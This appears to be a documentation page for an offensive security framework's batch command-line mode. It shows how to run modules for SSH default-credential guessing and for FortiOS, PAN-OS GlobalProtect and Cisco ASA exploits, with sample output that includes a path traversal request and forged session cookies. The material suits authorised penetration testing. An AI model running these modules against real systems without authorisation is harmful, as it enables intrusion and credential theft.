# Non-interactive (batch) CLI

**Language:** English (en-US). **pt-BR:** [../pt-BR/04-modo-nao-interativo.md](../pt-BR/04-modo-nao-interativo.md)

Non-interactive mode runs a single module with pre-set options without launching the
interactive shell. Useful for scripting, CI pipelines, and automation.

---

## Syntax

```bash
python fxf.py -m <module/path> [-s "option value"] [-s "option value"] ...
python fxf.py --module <module/path> --set "option value"
```

| Flag | Short | Long | Type | Required | Description |
|------|-------|------|------|----------|-------------|
| Module | `-m` | `--module` | `string` | yes | Module path (slashes or dots) |
| Set option | `-s` | `--set` | `string` | no (repeatable) | `"option_name value"` — first token is option name |
| Help | `-h` | `--help` | flag | no | Print usage and exit |

Internal execution flow:
1. `use <module>` — load the module
2. Each `-s "option value"` → `set option value`
3. `run` — execute

---

## Examples

### Credential test — SSH default credentials

```bash
python fxf.py \
    -m creds/generic/ssh_default \
    -s "target 192.168.0.50" \
    -s "port 22" \
    -s "threads 4"
```

**Sample output:**
```
[*] Running module creds.generic.ssh_default...
[*] target => 192.168.0.50
[*] port => 22
[*] threads => 4
[+] Found credentials: admin / admin
[+] Found credentials: admin / 1234
```

### Exploit — FortiOS SSL-VPN path traversal (CVE-2018-13379)

```bash
python fxf.py \
    -m exploits/perimeter/fortinet/fortios_sslvpn_path_traversal_cve_2018_13379 \
    -s "target 10.0.0.1" \
    -s "port 443" \
    -s "ssl true"
```

**Sample output:**
```
[*] Running module exploits.perimeter.fortinet.fortios_sslvpn_path_traversal_cve_2018_13379...
[+] /remote/fgt_lang?lang=/../../..//////////dev/cmdb/sslvpn_websession — HTTP 200
[+] Session file contents: [... hashed credentials ...]
```

### Exploit — PAN-OS GlobalProtect auth bypass (CVE-2026-0257)

```bash
python fxf.py \
    -m exploits/perimeter/paloalto/globalprotect_auth_bypass_cve_2026_0257 \
    -s "target vpn.corp.example.com" \
    -s "port 443" \
    -s "ssl true" \
    -s "forge_user admin" \
    -s "dump_session true"
```

**Sample output:**
```
[*] Running module exploits.perimeter.paloalto.globalprotect_auth_bypass_cve_2026_0257...
[*] Stage 1 - Fingerprinting GlobalProtect on vpn.corp.example.com:443...
[+] [CVE-2026-0257] GlobalProtect portal detected
[*] Stage 2 - Extracting TLS certificate chain...
[+] [CVE-2026-0257] Certificate extracted: subject='CN=vpn.corp.example.com' key=RSAPublicKey
[*] Stage 3 - Forging authentication override cookies...
[+] [CVE-2026-0257] Cookie forged: user='admin' os=Windows cookie=ng9ygxlaclylN...
[*] Stage 4 - Submitting forged cookies to GlobalProtect endpoints...
[+] [CVE-2026-0257] BYPASS CONFIRMED via /ssl-vpn/prelogin.esp -- forged user='admin' os=Windows!
[*] Stage 5 - Session metadata dump (user='admin'):
[+] [CVE-2026-0257] Response snippet: <authentication-override><username>admin</username>...
[*] Remediation:
[*]   Patch: PAN-OS 10.2.7-h34+ / 11.1.15+ / 11.2.12+ / 12.1.7+
[*]   Advisory: https://security.paloaltonetworks.com/CVE-2026-0257
```

### AutoPwn — automated perimeter scan

```bash
python fxf.py \
    -m scanners/autopwn \
    -s "target 10.0.0.1" \
    -s "timing_template polite" \
    -s "target_device_class ngfw" \
    -s "check_exploits true" \
    -s "check_creds true"
```

### Install NSE scripts (non-interactive)

```bash
# Auto-install
python fxf.py -c "install-nse"

# Force overwrite
python fxf.py -c "install-nse --force"

# Custom path (e.g. macOS Homebrew)
python fxf.py -c "install-nse --path /opt/homebrew/share/nmap/scripts"
```

> **Note:** `-c` (raw command) is passed to the interpreter's `nonInteractive` handler.

---

## Help

```bash
python fxf.py -h
```

Output:
```
fxf.py -m <module> -s "<option> <value>"
```

---

## Pipelines and output redirection

```bash
# Redirect stdout (suppress coloring for grep)
python fxf.py -m creds/generic/ssh_default -s "target 10.0.0.1" 2>/dev/null | grep "Found"

# Append to log
python fxf.py -m exploits/perimeter/cisco/asa_ftd_path_traversal_cve_2020_3452 \
    -s "target 10.0.0.1" >> audit.log 2>&1
```

Output may include credentials, banners, or session tokens. Redirect with care.
There is no universal JSON output mode.

---

[Wiki hub](../README.md)
